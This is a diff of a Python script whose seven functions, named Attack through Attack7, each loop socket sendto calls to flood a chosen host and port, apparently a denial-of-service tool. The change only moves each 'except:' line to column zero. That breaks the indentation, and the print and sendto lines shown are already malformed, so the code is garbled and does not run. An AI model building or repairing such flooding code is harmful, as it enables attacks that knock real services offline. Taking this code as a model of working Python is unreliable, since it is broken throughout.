@@ -36,7 +36,7 @@ def Attack():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -53,7 +53,7 @@ def Attack2():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -70,7 +70,7 @@ def Attack3():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -87,7 +87,7 @@ def Attack4():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -104,7 +104,7 @@ def Attack5():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -121,7 +121,7 @@ def Attack6():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
@@ -138,7 +138,7 @@ def Attack7():
 			for x in range(times):
 				s.sendto(bytes,addr,pack)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
-		except:
+except:
 			s.close()
 			print("[K] Sent Attack To Host And Port % %"(ip(str,port))
 
